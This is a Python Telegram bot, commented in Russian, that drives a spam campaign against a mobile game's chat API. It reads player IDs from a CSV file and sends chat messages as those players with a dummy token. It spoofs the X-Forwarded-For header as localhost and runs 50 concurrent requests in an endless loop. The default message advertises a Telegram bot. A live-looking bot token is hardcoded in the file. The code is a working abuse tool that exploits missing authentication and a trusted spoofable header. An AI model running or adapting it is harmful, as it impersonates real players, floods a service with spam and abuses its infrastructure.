import asyncio
import csv
import json
import os
from asyncio import Semaphore

import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message

# ===== НАСТРОЙКИ БОТА =====
BOT_TOKEN = "8675680128:AAHFJFAZTOAwhN2n6WxkW8xiFJaf2A7riJQ"  # Замените на свой токен

# Параметры API (из вашего скрипта)
URL = "https://api.efezgames.com/v1/social/sendChat"
FAKE_TOKEN = "p"
USE_SPOOFING = True
SPOOFED_IP = "127.0.0.1"
CONCURRENT_REQUESTS = 50
CYCLE_DELAY = 1  # секунд между кругами
CSV_FILE = "premiumaccount.csv"

# Настройки по умолчанию
DEFAULT_MESSAGE = "@EfezGame_bot - telega.soso niщии"
DEFAULT_CHANNELS = ["RU", "UA"]

# Глобальные переменные
is_running = False
send_task = None
total_sent = 0
current_message = DEFAULT_MESSAGE
current_channels = DEFAULT_CHANNELS.copy()

# Файл для сохранения настроек
SETTINGS_FILE = "bot_settings.json"
# ==========================

def load_settings():
    global current_message, current_channels
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            current_message = data.get("message", DEFAULT_MESSAGE)
            current_channels = data.get("channels", DEFAULT_CHANNELS)

def save_settings():
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump({
            "message": current_message,
            "channels": current_channels
        }, f, ensure_ascii=False, indent=2)

async def send_message(session: aiohttp.ClientSession, player_id: str, channel: str, semaphore: Semaphore):
    params = {
        "token": FAKE_TOKEN,
        "playerID": player_id,
        "message": current_message,
        "channel": channel
    }
    headers = {}
    if USE_SPOOFING:
        headers["X-Forwarded-For"] = SPOOFED_IP

    async with semaphore:
        try:
            async with session.get(URL, params=params, headers=headers, timeout=5) as response:
                status = response.status
                print(f"[ID {player_id} | {channel}] Статус: {status}")
                return status
        except Exception as e:
            print(f"[ID {player_id} | {channel}] Ошибка: {e}")
            return None

async def send_loop():
    global total_sent, is_running
    cycle = 1
    while is_running:
        print(f"🔄 Круг {cycle} начат...")
        # Читаем ID из CSV
        try:
            with open(CSV_FILE, newline='', encoding='utf-8') as f:
                reader = csv.reader(f)
                player_ids = [row[0].strip() for row in reader if row]
        except FileNotFoundError:
            print(f"❌ Файл {CSV_FILE} не найден. Рассылка остановлена.")
            is_running = False
            break
        except Exception as e:
            print(f"Ошибка чтения CSV: {e}")
            await asyncio.sleep(CYCLE_DELAY)
            continue

        if not player_ids:
            print("❌ Нет ID для рассылки. Ждём...")
            await asyncio.sleep(CYCLE_DELAY)
            continue

        # Чередование каналов
        tasks_data = []
        for i, pid in enumerate(player_ids):
            channel = current_channels[i % len(current_channels)]
            tasks_data.append((pid, channel))

        semaphore = Semaphore(CONCURRENT_REQUESTS)
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [send_message(session, pid, ch, semaphore) for pid, ch in tasks_data]
            results = await asyncio.gather(*tasks)
            success_count = sum(1 for r in results if r == 200)
            total_sent += success_count
            print(f"✅ Круг {cycle} завершён. Успешно: {success_count} | Всего: {len(tasks_data)} | Всего отправлено: {total_sent}")
        cycle += 1
        await asyncio.sleep(CYCLE_DELAY)
    print("🛑 Цикл рассылки остановлен.")

# ===== КОМАНДЫ БОТА =====
async def cmd_start(message: Message):
    await message.answer(
        "🤖 Бот для управления рассылкой\n\n"
        "/on — запустить рассылку\n"
        "/off — остановить рассылку\n"
        "/status — текущий статус\n"
        "/set_message <текст> — изменить сообщение\n"
        "/set_channels <RU,UA,EN> — задать каналы через запятую\n"
        "/show_settings — показать текущие настройки"
    )

async def cmd_on(message: Message, bot: Bot):
    global is_running, send_task
    if is_running:
        await message.answer("⚠️ Рассылка уже запущена.")
        return
    is_running = True
    send_task = asyncio.create_task(send_loop())
    await message.answer("✅ Рассылка запущена (бесконечный цикл).")

async def cmd_off(message: Message):
    global is_running, send_task
    if not is_running:
        await message.answer("⚠️ Рассылка не запущена.")
        return
    is_running = False
    if send_task:
        await send_task  # ждём завершения текущего круга
        send_task = None
    await message.answer("⏹ Рассылка остановлена.")

async def cmd_status(message: Message):
    status_text = "🟢 Активна" if is_running else "🔴 Остановлена"
    await message.answer(
        f"**Статус:** {status_text}\n"
        f"**Отправлено сообщений:** {total_sent}\n"
        f"**Текст сообщения:** {current_message[:50]}{'…' if len(current_message)>50 else ''}\n"
        f"**Каналы:** {', '.join(current_channels)}",
        parse_mode="Markdown"
    )

async def cmd_set_message(message: Message):
    global current_message
    text = message.text[len("/set_message "):].strip()
    if not text:
        await message.answer("❌ Укажите текст после команды, например:\n`/set_message Привет!`", parse_mode="Markdown")
        return
    current_message = text
    save_settings()
    await message.answer(f"✅ Текст сообщения изменён на:\n`{current_message}`", parse_mode="Markdown")

async def cmd_set_channels(message: Message):
    global current_channels
    arg = message.text[len("/set_channels "):].strip()
    if not arg:
        await message.answer("❌ Укажите каналы через запятую, например:\n`/set_channels RU,UA,EN`", parse_mode="Markdown")
        return
    channels = [ch.strip().upper() for ch in arg.split(",") if ch.strip()]
    if not channels:
        await message.answer("❌ Не удалось распознать каналы.")
        return
    current_channels = channels
    save_settings()
    await message.answer(f"✅ Каналы установлены: {', '.join(current_channels)}")

async def cmd_show_settings(message: Message):
    await message.answer(
        f"📝 **Текущее сообщение:**\n`{current_message}`\n\n"
        f"📢 **Каналы:** {', '.join(current_channels)}",
        parse_mode="Markdown"
    )

async def main():
    load_settings()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()

    dp.message.register(cmd_start, Command("start"))
    dp.message.register(cmd_on, Command("on"))
    dp.message.register(cmd_off, Command("off"))
    dp.message.register(cmd_status, Command("status"))
    dp.message.register(cmd_set_message, Command("set_message"))
    dp.message.register(cmd_set_channels, Command("set_channels"))
    dp.message.register(cmd_show_settings, Command("show_settings"))

    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
